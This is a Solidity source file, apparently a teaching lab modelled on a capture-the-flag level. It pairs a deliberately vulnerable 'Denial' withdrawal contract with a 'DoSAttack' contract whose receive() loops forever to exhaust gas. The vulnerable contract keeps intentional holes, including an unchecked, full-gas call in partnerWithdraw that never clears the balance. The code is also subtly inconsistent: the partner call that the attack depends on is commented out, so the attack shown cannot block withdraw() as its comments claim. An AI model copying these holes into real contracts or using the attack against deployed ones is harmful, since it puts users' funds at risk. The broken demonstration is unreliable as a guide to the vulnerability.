// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Denial
 * @notice This contract allows an owner and a designated partner to withdraw a portion of the contract's balance
 * The partner can be set dynamically, and both parties receive a 1% share during each withdrawal
 * Vulnerable to Denial of Service (DoS) via malicious fallback behaviour of the partner
 */
contract Denial {
    address public partner; // Designated withdrawal partner — they pay gas for call execution
    address public owner; // Owner of the contract
    uint256 timeLastWithdrawn; // Timestamp of the last withdrawal (not used in logic but may be useful for tracking)

    // Tracks how much ETH has been assigned to each partner (not enforced in withdraw, only stored)
    mapping(address => uint256) withdrawPartnerBalances;

    constructor(address _owner) {
        owner = _owner;
    }

    /**
     * @notice Sets the partner address who will receive a share during withdrawal
     * Only the owner is allowed to set the partner.
     */
    function setWithdrawPartner(address _partner) public {
        require(msg.sender == owner, "invalid sender");
        partner = _partner;
    }

    /**
     * @notice Allows either the owner or the partner to trigger a withdrawal
     * 1% of the contract balance is transferred to the partner (via call — commented out here),
     * and 1% is transferred to the owner via `.transfer()`
     *
     * VULNERABILITY:
     * - The commented-out `partner.call{value: amountToSend}("")` would have allowed the partner to execute arbitrary fallback code
     * - If this line is active and the partner is a malicious contract, it can consume all gas and prevent execution of the remaining logic
     * - Even with only `.transfer()` to the owner active, if the line above were used, a malicious partner could block withdrawals entirely
     *
     * Because `.transfer()` is limited to 2300 gas, it won't allow reentrancy, but `.call()` sends all gas by default
     */
    function withdraw() public {
        require(msg.sender == owner || msg.sender == partner, "invalid sender");

        uint256 amountToSend = address(this).balance / 100;

        // POTENTIAL DoS attack vector — if this line is uncommented and partner is malicious,
        // they can block the function by consuming all gas via fallback
        // partner.call{value: amountToSend}("");

        // Safe from reentrancy due to fixed gas
        payable(owner).transfer(amountToSend);

        timeLastWithdrawn = block.timestamp;

        // Records how much the current partner was meant to receive
        // (not automatically paid — partner must call partnerWithdraw)
        withdrawPartnerBalances[partner] += amountToSend;
    }

    /**
     * @notice Allows the partner to withdraw their accumulated balance.
     * This again uses `.call()` and does not validate success or limit gas
     *
     * VULNERABILITY:
     * - `.call` sends all gas, so the partner could again trigger a DoS here
     * - There is no zeroing out of `withdrawPartnerBalances[partner]`, allowing reentrant withdrawal if fallback is malicious
     */
    // slither-disable-next-line arbitrary-send-eth
    function partnerWithdraw() external {
        partner.call{value: withdrawPartnerBalances[partner]}(""); // Unsafe pattern: unbounded gas & no success check
    }

    // Allow deposits via the fallback function
    receive() external payable {}

    // Convenience function to check the balance held in the contract
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title DoSAttack
 * @notice A malicious contract used to exploit the Denial contract by consuming all gas in fallback.
 * When set as the partner, it prevents `withdraw()` from completing due to gas exhaustion.
 */
contract DoSAttack {
    Denial public denial;

    constructor(address _denial) {
        denial = Denial(payable(_denial));
    }

    // Helper function to invoke withdraw from the Denial contract
    function withdraw() external {
        denial.withdraw();
    }

    // Fallback function that enters an infinite loop, exhausting all gas
    receive() external payable {
        while (true) {
            // Infinite loop causes the gas to run out,
            // preventing the Denial contract from completing execution.
        }
    }
}
